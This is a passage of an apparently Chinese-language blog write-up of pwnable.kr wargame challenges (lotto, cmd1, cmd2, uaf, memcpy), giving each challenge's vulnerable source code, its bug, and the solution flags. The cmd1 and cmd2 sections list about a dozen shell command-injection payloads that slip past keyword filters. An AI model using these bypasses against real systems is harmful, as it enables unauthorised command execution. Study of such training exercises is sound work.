P.S. 看了一下大佬们的WP, 原来还可以输入负数&#x2026;.然后故意输掉&#x2026;..
高, 实在是高!
</p>
</div>
</div>
</div>

<div id="outline-container-sec-13" class="outline-2">
<h2 id="sec-13">lotto</h2>
<div class="outline-text-2" id="text-13">
</div><div id="outline-container-sec-13-1" class="outline-3">
<h3 id="sec-13-1">简介</h3>
<div class="outline-text-3" id="text-13-1">
<pre class="example">
Mommy! I made a lotto program for my homework.
do you want to play?


ssh lotto@pwnable.kr -p2222 (pw:guest)
</pre>

<p>
大乐透?
</p>
</div>
</div>

<div id="outline-container-sec-13-2" class="outline-3">
<h3 id="sec-13-2">分析</h3>
<div class="outline-text-3" id="text-13-2">
<p>
lotto.c
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> submit[<span class="number">6</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">play</span><span class="params">()</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Submit your 6 lotto bytes : "</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    r = read(<span class="number">0</span>, submit, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Lotto Start!\n"</span>);</span><br><span class="line">    <span class="comment">//sleep(1);</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// generate lotto numbers</span></span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/urandom"</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd==-<span class="number">1</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error. tell admin\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> lotto[<span class="number">6</span>];</span><br><span class="line">    <span class="keyword">if</span>(read(fd, lotto, <span class="number">6</span>) != <span class="number">6</span>){</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"error2. tell admin\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(-<span class="number">1</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++){</span><br><span class="line">        lotto[i] = (lotto[i] % <span class="number">45</span>) + <span class="number">1</span>;     <span class="comment">// 1 ~ 45</span></span><br><span class="line">    }</span><br><span class="line">    close(fd);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// calculate lotto score</span></span><br><span class="line">    <span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++){</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++){</span><br><span class="line">            <span class="keyword">if</span>(lotto[i] == submit[j]){</span><br><span class="line">                match++;</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// win!</span></span><br><span class="line">    <span class="keyword">if</span>(match == <span class="number">6</span>){</span><br><span class="line">        system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">else</span>{</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bad luck...\n"</span>);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">help</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"- nLotto Rule -\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"nlotto is consisted with 6 random natural numbers less than 46\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"your goal is to match lotto numbers as many as you can\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"if you win lottery for *1st place*, you will get reward\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"for more details, follow the link below\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"http://www.nlotto.co.kr/counsel.do?method=playerGuide#buying_guide01\n\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"mathematical chance to win this game is known to be 1/8145060.\n"</span>);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>{</span><br><span class="line"></span><br><span class="line">    <span class="comment">// menu</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> menu;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"- Select Menu -\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"1. Play Lotto\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"2. Help\n"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"3. Exit\n"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;menu);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(menu){</span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                play();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                help();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"bye\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"invalid menu\n"</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
程序先从标准输入获取六个字符, 再从 /dev/urandom 中经过一系列操作读取六个字符,
当这两组字符相等的时候, 就给我们flag&#x2026;&#x2026;
</p>

<p>
帮助贴心地告诉了我们从数学上来讲我们获胜的机会是 <b>1/8145060</b>
</p>

<p>
一开始是一脸懵逼的, 甚至想破解 /dev/urandom 的算法, 后来仔细看代码, 发现了一个地方有漏洞
</p>

<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// calculate lotto score</span></span><br><span class="line"><span class="keyword">int</span> match = <span class="number">0</span>, j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">6</span>; i++){</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>; j&lt;<span class="number">6</span>; j++){</span><br><span class="line">        <span class="keyword">if</span>(lotto[i] == submit[j]){</span><br><span class="line">            match++;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
这个地方, 本意应该是想实现顺序无关的比较, 结果已经存在过的字符没有过滤&#x2026;
导致了我们的输入至少有任意一个在 <code>lotto</code> 数组中出现, 我们就能过关
</p>

<p>
那就随便试试吧, 我运气很好, 第二次就过了
</p>

<p>
flag: <code>sorry mom... I FORGOT to check duplicate numbers... :(</code>
</p>
</div>
</div>
</div>

<div id="outline-container-sec-14" class="outline-2">
<h2 id="sec-14">cmd1</h2>
<div class="outline-text-2" id="text-14">
</div><div id="outline-container-sec-14-1" class="outline-3">
<h3 id="sec-14-1">简介</h3>
<div class="outline-text-3" id="text-14-1">
<pre class="example">
Mommy! what is PATH environment in Linux?

ssh cmd1@pwnable.kr -p2222 (pw:guest)
</pre>
</div>
</div>

<div id="outline-container-sec-14-2" class="outline-3">
<h3 id="sec-14-2">分析</h3>
<div class="outline-text-3" id="text-14-2">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>{</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"sh"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"tmp"</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>{</span><br><span class="line">    putenv(<span class="string">"PATH=/thankyouverymuch"</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    system( argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
逻辑很简单, 从命令行参数中获取字符串当做命令执行
</p>

<p>
但是这个地方过滤了 flag, tmp, sh, 并且更改了path
</p>

<p>
不难绕过, payload ./cmd1 "/bin/cat fla*"
</p>

<p>
flag: <code>mommy now I get what PATH environment is for :)</code>
</p>
</div>
</div>
</div>

<div id="outline-container-sec-15" class="outline-2">
<h2 id="sec-15">cmd2</h2>
<div class="outline-text-2" id="text-15">
</div><div id="outline-container-sec-15-1" class="outline-3">
<h3 id="sec-15-1">简介</h3>
<div class="outline-text-3" id="text-15-1">
<pre class="example">
Daddy bought me a system command shell.
but he put some filters to prevent me from playing with it without his permission...
but I wanna play anytime I want!

ssh cmd2@pwnable.kr -p2222 (pw:flag of cmd1)
</pre>
</div>
</div>

<div id="outline-container-sec-15-2" class="outline-3">
<h3 id="sec-15-2">分析</h3>
<div class="outline-text-3" id="text-15-2">
<div class="org-src-container">

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">filter</span><span class="params">(<span class="keyword">char</span>* cmd)</span></span>{</span><br><span class="line">    <span class="keyword">int</span> r=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"="</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"PATH"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"export"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"/"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"`"</span>)!=<span class="number">0</span>;</span><br><span class="line">    r += <span class="built_in">strstr</span>(cmd, <span class="string">"flag"</span>)!=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="keyword">char</span>** environ;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">delete_env</span><span class="params">()</span></span>{</span><br><span class="line">    <span class="keyword">char</span>** p;</span><br><span class="line">    <span class="keyword">for</span>(p=environ; *p; p++) <span class="built_in">memset</span>(*p, <span class="number">0</span>, <span class="built_in">strlen</span>(*p));</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>** envp)</span></span>{</span><br><span class="line">    delete_env();</span><br><span class="line">    putenv(<span class="string">"PATH=/no_command_execution_until_you_become_a_hacker"</span>);</span><br><span class="line">    <span class="keyword">if</span>(filter(argv[<span class="number">1</span>])) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, argv[<span class="number">1</span>]);</span><br><span class="line">    system( argv[<span class="number">1</span>] );</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>

<p>
和上一题是同一类型的, 不过这个过滤有点丧心病狂啊&#x2026;
</p>

<p>
但这次没有过滤tmp, 可以在/tmp下创建一个symbolic link到flag
</p>

<p>
最终解法: ~/home/cmd2/cmd2 'read -r a &lt;galf;echo $a'~
</p>

<p>
flag: <code>FuN_w1th_5h3ll_v4riabl3s_haha</code>
</p>
</div>
</div>

<div id="outline-container-sec-15-3" class="outline-3">
<h3 id="sec-15-3">大佬们的解法</h3>
<div class="outline-text-3" id="text-15-3">
<div class="org-src-container">

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">./cmd2 <span class="string">"read b &lt; fl\ag; echo \$b"</span></span><br><span class="line"><span class="comment"># 妙啊, 利用转义符巧妙地避开了过滤</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cd</span> / &amp;&amp; /home/cmd2/cmd2 <span class="string">'$(pwd)"bin"$(pwd)cat $(pwd)"home"$(pwd)"cmd2"$(pwd)"fl""ag"'</span></span><br><span class="line"><span class="comment"># woc, NBNB. 没有反斜杠, 我们就创造反斜杠...</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">"command -p cat fla*"</span></span><br><span class="line"><span class="comment"># 涨知识了, 膜</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'$(echo "\057\0142\0151\0156\057\0143\0141\0164\040\0146\0154\0141\0147")'</span></span><br><span class="line"><span class="comment"># 社会社会</span></span><br><span class="line"></span><br><span class="line">mkdir /tmp/ca</span><br><span class="line">ln <span class="operator">-s</span> /bin/cat /tmp/cat</span><br><span class="line"><span class="built_in">cd</span> /tmp/ca</span><br><span class="line">ln <span class="operator">-s</span> /home/cmd2/flag f</span><br><span class="line">/home/cmd2/cmd2 <span class="string">"\${PWD}t f"</span></span><br><span class="line"><span class="comment"># 全部建symbolic link</span></span><br><span class="line"></span><br><span class="line">/home/cmd2/cmd2 <span class="string">'set -s'</span></span><br><span class="line">/bin/cat /home/cmd2/flag</span><br><span class="line"><span class="comment"># 愣是没看懂</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'$(printf \\057bin\\057cat) fl""ag'</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'$(printf "%b%c%c%c%b%c%c%c%b%b%b%c%c%c%c" "\57" "b" "i" "n" "\57" "c" "a" "t" "\40" "\56" "\57" "f" "l" "a" "g")'</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> <span class="string">"/bin/cat flag"</span> | ./cmd2 <span class="string">"read myvar; command \$myvar"</span></span><br><span class="line"></span><br><span class="line">./cmd2 <span class="string">'echo $($(cd .. &amp;&amp; cd .. &amp;&amp; pwd)bin$(cd .. &amp;&amp; cd .. &amp;&amp; pwd)cat fla*)'</span></span><br></pre></td></tr></table></figure>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-16" class="outline-2">
<h2 id="sec-16">uaf</h2>
<div class="outline-text-2" id="text-16">
</div><div id="outline-container-sec-16-1" class="outline-3">
<h3 id="sec-16-1">简介</h3>
<div class="outline-text-3" id="text-16-1">
<pre class="example">
Mommy, what is Use After Free bug?

ssh uaf@pwnable.kr -p2222 (pw:guest)
</pre>

<p>
刚看完Double Free觉得看不懂还是来做pwnable慢慢练习,
结果就来了这个&#x2026;
</p>
</div>
</div>

<div id="outline-container-sec-16-2" class="outline-3">
<h3 id="sec-16-2">分析</h3>
<div class="outline-text-3" id="text-16-2">
<p>
卧槽这次竟然是C++
</p>

<div class="org-src-container">

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;cstdlib&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Human{</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">give_shell</span><span class="params">()</span></span>{</span><br><span class="line">        system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    }</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">    <span class="keyword">int</span> age;</span><br><span class="line">    <span class="built_in">string</span> name;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>{</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"My name is "</span> &lt;&lt; name &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am "</span> &lt;&lt; age &lt;&lt; <span class="string">" years old"</span> &lt;&lt; endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Man: <span class="keyword">public</span> Human{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Man(<span class="built_in">string</span> name, <span class="keyword">int</span> age){</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>{</span><br><span class="line">        Human::introduce();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a nice guy!"</span> &lt;&lt; endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> Woman: <span class="keyword">public</span> Human{</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    Woman(<span class="built_in">string</span> name, <span class="keyword">int</span> age){</span><br><span class="line">        <span class="keyword">this</span>-&gt;name = name;</span><br><span class="line">        <span class="keyword">this</span>-&gt;age = age;</span><br><span class="line">    }</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">introduce</span><span class="params">()</span></span>{</span><br><span class="line">        Human::introduce();</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"I am a cute girl!"</span> &lt;&lt; endl;</span><br><span class="line">    }</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>{</span><br><span class="line">    Human* m = <span class="keyword">new</span> Man(<span class="string">"Jack"</span>, <span class="number">25</span>);</span><br><span class="line">    Human* w = <span class="keyword">new</span> Woman(<span class="string">"Jill"</span>, <span class="number">21</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">size_t</span> len;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> op;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>){</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">"1. use\n2. after\n3. free\n"</span>;</span><br><span class="line">        <span class="built_in">cin</span> &gt;&gt; op;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">switch</span>(op){</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            m-&gt;introduce();</span><br><span class="line">            w-&gt;introduce();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            len = atoi(argv[<span class="number">1</span>]);</span><br><span class="line">            data = <span class="keyword">new</span> <span class="keyword">char</span>[len];</span><br><span class="line">            read(open(argv[<span class="number">2</span>], O_RDONLY), data, len);</span><br><span class="line">            <span class="built_in">cout</span> &lt;&lt; <span class="string">"your data is allocated"</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">delete</span> m;</span><br><span class="line">            <span class="keyword">delete</span> w;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;   </span><br><span class="line">}</span><br></pre></td></tr></table></figure>
</div>
</div>
</div>
</div>
<div id="outline-container-sec-17" class="outline-2">
<h2 id="sec-17">memcpy</h2>
<div class="outline-text-2" id="text-17">
</div><div id="outline-container-sec-17-1" class="outline-3">
<h3 id="sec-17-1">简介</h3>
<div class="outline-text-3" id="text-17-1">
<pre class="example">
Are you tired of hacking?, take some rest here.
Just help me out with my small experiment regarding memcpy performance. 
after that, flag is yours.

http://pwnable.kr/bin/memcpy.c

ssh memcpy@pwnable.kr -p2222 (pw:guest)
</pre>

<p>
看介绍似乎不难? 不过这个解题人数让我有些不放心 = =
</p>
</div>
</div>

<div id="outline-container-sec-17-2" class="outline-3">
<h3 id="sec-17-2">分析</h3>
<div class="outline-text-3" id="text-17-2">
<p>
readme
</p>

<pre class="example">
the compiled binary of "memcpy.c" source code (with real flag) will be executed under memcpy_pwn privilege if you connect to port 9022.
execute the binary by connecting to daemon(nc 0 9022).
</pre>

<p>
真实的可执行文件只能通过 <code>nc 0 9022</code> 访问, 下面是 memcpy.c 的源码(消去了flag)
</p>


<p>
memcpy.c
</p>

<div class="org-src-container">

